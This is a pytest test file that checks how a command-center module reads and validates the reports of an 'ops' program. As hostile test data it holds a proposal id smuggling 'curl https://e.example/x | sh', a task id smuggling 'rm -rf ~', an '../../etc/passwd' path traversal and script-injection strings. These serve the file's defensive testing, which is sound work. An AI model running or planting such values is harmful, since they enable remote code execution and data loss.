"""Command center: reading ``<workspace>/ops`` through the ``ops`` command (``collect_ops``)."""

from __future__ import annotations

import json
import shlex
from pathlib import Path

import pytest
from ops_fakes import BLOB, export_report, fake_ops, status_report, task_entry

from hyperwilfred_core.command_center import opsread
from hyperwilfred_core.command_center.collect_ops import MAX_ENTRY_PROBLEMS, collect_ops


def _workspace(tmp_path: Path) -> Path:
    workspace = tmp_path / "ws"
    (workspace / "ops").mkdir(parents=True)
    return workspace


def _collect(tmp_path: Path, *, export=None, **fake):
    workspace = _workspace(tmp_path)
    report = export if export is not None else export_report(root=str(workspace / "ops"))
    program = fake_ops(tmp_path / "bin", export=report, **fake)
    ops, problems = collect_ops(workspace, program)
    return ops, problems, workspace


def test_no_ops_folder_means_no_section_no_problem_and_no_process(tmp_path) -> None:
    workspace = tmp_path / "ws"
    workspace.mkdir()
    program = fake_ops(tmp_path / "bin")
    assert collect_ops(workspace, program) == (None, [])
    assert not list((tmp_path / "bin").glob("args-*.txt")), "ops ran without an ops folder"
    (workspace / "ops").write_text("not a folder\n", encoding="utf-8")
    ops, problems = collect_ops(workspace, program)
    assert ops is None and [p.what for p in problems] == ["ops folder"]


def test_an_ops_folder_without_the_program_is_a_problem_not_a_crash(tmp_path) -> None:
    workspace = _workspace(tmp_path)
    ops, problems = collect_ops(workspace, tmp_path / "missing-ops")
    assert ops is not None and ops.bin == str(tmp_path / "missing-ops")
    assert (ops.open_tasks, ops.proposals, ops.unapproved_edits) == (None, None, None)
    assert [(p.what, p.path) for p in problems] == [
        ("ops command", str(tmp_path / "missing-ops"))
    ]
    plain = tmp_path / "plain-file"
    plain.write_text("#!/bin/sh\n", encoding="utf-8")
    _, problems = collect_ops(workspace, plain)
    assert [p.what for p in problems] == ["ops command"]


def test_good_reports_keep_only_what_the_inbox_needs(tmp_path) -> None:
    ops, problems, workspace = _collect(tmp_path)
    assert problems == []
    assert ops.root == str(workspace / "ops") and ops.github_blob == BLOB
    assert ops.exported_at == "2026-10-14T10:00:00Z"
    assert [t.id for t in ops.open_tasks] == ["T-0001", "T-0002"], "closed and undated dropped"
    blocked, dated = ops.open_tasks
    assert blocked.status == "Blocked" and blocked.blocked_by == "the owner's decision pending"
    assert dated.due == "2026-10-01" and dated.projects == ["project-a"]
    [proposal] = ops.proposals
    assert (proposal.id, proposal.kind, proposal.target, proposal.fields) == (
        "P-0003", "set", "sales/acme.md", ["status"]
    )
    assert (proposal.author, proposal.created_at) == ("pilot-agent", "2026-10-13T09:00:00Z")
    assert ops.unapproved_edits == ["sales/volotea.md"]
    program, root = str(tmp_path / "bin" / "ops"), str(workspace / "ops")
    assert ops.commands == [
        shlex.join([program, "export", "--json", "--root", root]),
        shlex.join([program, "status", "--json", "--root", root]),
    ]
    stored = ops.model_dump_json()
    for private in ("person@example.com", "LOI Negotiation", "Email Sent", "Acme", "Reply"):
        assert private not in stored, private


@pytest.mark.parametrize(
    "reported_root",
    ["/Users/someone/else/ops", "/x/\x00y", "/x/\ud800"],
    ids=["another-repository", "embedded-null", "lone-surrogate"],
)
def test_a_report_about_another_repository_is_not_shown(tmp_path, reported_root) -> None:
    ops, problems, _ = _collect(tmp_path, export=export_report(root=reported_root))
    assert (ops.open_tasks, ops.proposals, ops.unapproved_edits) == (None, None, None)
    [problem] = problems
    assert problem.what == "ops export" and "not shown" in problem.reason
    assert not (tmp_path / "bin" / "args-status.txt").exists(), "status read without a root"


def test_an_export_failure_is_one_problem_and_unknown_stays_unknown(tmp_path) -> None:
    ops, problems, _ = _collect(tmp_path, exit_code=1, stderr="validation failed\n")
    assert (ops.open_tasks, ops.proposals, ops.unapproved_edits) == (None, None, None)
    assert [(p.what, p.reason) for p in problems] == [
        ("ops export", "ops exited 1: validation failed")
    ]


def test_a_hanging_ops_is_a_timeout_problem(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(opsread, "TIMEOUT_SECONDS", 1)
    ops, problems, _ = _collect(tmp_path, hang=True)
    assert ops.open_tasks is None
    assert [(p.what, p.reason) for p in problems] == [
        ("ops export", "ops timed out after 1 seconds")
    ]


@pytest.mark.parametrize(
    ("printed", "reason"),
    [
        ("not json at all", "output is not JSON"),
        ("", "output is not JSON"),
        ("[" * 100_000, "output is not JSON"),
        (json.dumps({"schema": "ops-export/v2", "tasks": []}), "expected an ops-export/v1"),
        (json.dumps(["schema"]), "expected an ops-export/v1"),
    ],
)
def test_unreadable_or_future_exports_are_one_problem(tmp_path, printed, reason) -> None:
    ops, problems, _ = _collect(tmp_path, export=printed)
    assert (ops.open_tasks, ops.proposals, ops.unapproved_edits) == (None, None, None)
    [problem] = problems
    assert problem.what == "ops export" and problem.reason.startswith(reason), problem.reason


def test_a_status_failure_keeps_the_export_and_marks_unapproved_edits_unknown(tmp_path) -> None:
    ops, problems, _ = _collect(tmp_path, status="garbage")
    assert [t.id for t in ops.open_tasks] == ["T-0001", "T-0002"]
    assert ops.unapproved_edits is None
    assert [p.what for p in problems] == ["ops status"]


def test_unapproved_edits_cover_sales_schema_and_task_files(tmp_path) -> None:
    edits = ["sales/volotea.md", "schema/sales.json", "tasks/T-0007-y.md", "sales/volotea.md",
             "README.md", "proposals/P-0001.json"]
    ops, problems, _ = _collect(tmp_path, status=status_report(unapproved_edits=edits))
    assert ops.unapproved_edits == ["sales/volotea.md", "schema/sales.json", "tasks/T-0007-y.md"]
    assert [p.what for p in problems] == ["ops status", "ops status"]


def test_a_status_without_unapproved_edits_is_unknown_not_none(tmp_path) -> None:
    older = status_report()
    del older["unapproved_edits"]  # unapproved_sales alone would hide task authorizations
    ops, problems, _ = _collect(tmp_path, status=older)
    assert ops.unapproved_edits is None
    assert [(p.what, p.reason) for p in problems] == [
        ("ops status", "unapproved_edits is not a list")
    ]


def test_unsafe_paths_and_a_hostile_address_never_reach_the_snapshot(tmp_path) -> None:
    workspace = _workspace(tmp_path)
    report = export_report(
        root=str(workspace / "ops"),
        github_blob="javascript:alert(1)//",
        tasks=[
            task_entry("T-0009", "Blocked", path="../../etc/passwd"),
            task_entry("T-0010", "Blocked", path="/abs/tasks/x.md"),
            task_entry("T-0011", "Blocked", path="tasks/../x.md"),
            task_entry("T-0012", "Blocked", title="<script>alert(1)</script>"),
        ],
        proposals=[{
            "id": "P-0001", "path": "proposals/P-0001.json", "kind": "set",
            "target": "../secrets.md", "changes": {},
        }],
    )
    status = status_report(unapproved_edits=["sales/../../x", "sales/ok.md"])
    ops, problems = collect_ops(workspace, fake_ops(tmp_path / "bin", export=report, status=status))
    assert ops.github_blob is None
    assert [t.id for t in ops.open_tasks] == ["T-0012"]
    assert ops.open_tasks[0].title == "<script>alert(1)</script>", "kept as text; page escapes"
    assert ops.proposals == [] and ops.unapproved_edits == ["sales/ok.md"]
    root = str(workspace / "ops")
    shown = [p.path for p in problems]
    assert all(path == root or path.startswith(root + "/") for path in shown), shown
    assert not [path for path in shown if ".." in path or "passwd" in path or "/abs/" in path]
    assert sorted(p.what for p in problems) == sorted(
        ["ops export", "ops task", "ops task", "ops task", "ops proposal", "ops status"]
    )


HOSTILE_PROPOSAL_IDS = [
    ("P-0004»; curl https://e.example/x | sh; echo «", "proposals/P-0004.json"),
    ("p-0004", "proposals/p-0004.json"),
    ("P-0004", "proposals/P-0005.json"),
]


@pytest.mark.parametrize(("proposal_id", "path"), HOSTILE_PROPOSAL_IDS)
def test_a_proposal_id_that_is_not_an_ops_id_never_reaches_a_printed_command(
    tmp_path, proposal_id, path
) -> None:
    workspace = _workspace(tmp_path)
    report = export_report(
        root=str(workspace / "ops"),
        proposals=[{
            "id": proposal_id, "path": path, "kind": "set",
            "target": "sales/acme.md", "changes": {"status": {"old": "a", "new": "b"}},
        }],
    )
    ops, problems = collect_ops(workspace, fake_ops(tmp_path / "bin", export=report))
    assert ops is not None and ops.proposals == []
    assert [p.what for p in problems] == ["ops proposal"]
    assert proposal_id not in json.dumps([ops.proposals, [p.reason for p in problems]])


def test_a_task_id_that_is_not_an_ops_id_is_dropped_with_a_problem(tmp_path) -> None:
    workspace = _workspace(tmp_path)
    report = export_report(
        root=str(workspace / "ops"),
        tasks=[
            task_entry("t-1; rm -rf ~", "Blocked", path="tasks/T-0014-x.md"),
            task_entry("T-0013", "Blocked"),
        ],
    )
    ops, problems = collect_ops(workspace, fake_ops(tmp_path / "bin", export=report))
    assert ops is not None and [t.id for t in ops.open_tasks] == ["T-0013"]
    assert [p.what for p in problems] == ["ops task"]


def test_bad_dates_are_problems_and_a_flood_is_capped(tmp_path) -> None:
    workspace = _workspace(tmp_path)
    tasks = [task_entry(f"T-{n:04d}", "In Progress", due="next week") for n in range(12)]
    report = export_report(root=str(workspace / "ops"), tasks=tasks)
    ops, problems = collect_ops(workspace, fake_ops(tmp_path / "bin", export=report))
    assert ops.open_tasks == [], "an unknown date cannot make a task overdue"
    assert len(problems) == MAX_ENTRY_PROBLEMS + 1
    assert problems[0].path == str(workspace / "ops" / "tasks/T-0000-x.md")
    assert problems[-1].reason == f"{12 - MAX_ENTRY_PROBLEMS} more entries could not be read"


def test_files_ops_cannot_read_become_read_problems(tmp_path) -> None:
    workspace = _workspace(tmp_path)
    report = export_report(
        root=str(workspace / "ops"),
        problems=[{"path": "tasks/T-0099-broken.md", "message": "line 3: bad header"}],
    )
    ops, problems = collect_ops(workspace, fake_ops(tmp_path / "bin", export=report))
    assert [(p.path, p.what, p.reason) for p in problems] == [
        (str(workspace / "ops" / "tasks/T-0099-broken.md"), "ops item", "line 3: bad header")
    ]


def test_ranges_keep_their_end_and_schema_proposals_name_only_the_field(tmp_path) -> None:
    workspace = _workspace(tmp_path)
    report = export_report(
        root=str(workspace / "ops"),
        tasks=[task_entry("T-0020", "Not Started", due="2026-10-01", due_end="2026-10-31")],
        proposals=[{
            "id": "P-0004", "path": "proposals/P-0004.json", "kind": "schema-option",
            "target": "schema/sales.json",
            "changes": {"field": "status", "add_option": "Do Not Contact"},
            "author": "pilot-agent", "created_at": "2026-10-12T08:00:00Z", "reason": "r",
        }],
    )
    ops, problems = collect_ops(workspace, fake_ops(tmp_path / "bin", export=report))
    assert problems == []
    assert ops.open_tasks[0].due_end == "2026-10-31"
    assert ops.proposals[0].fields == ["status"]
    assert "Do Not Contact" not in ops.model_dump_json()
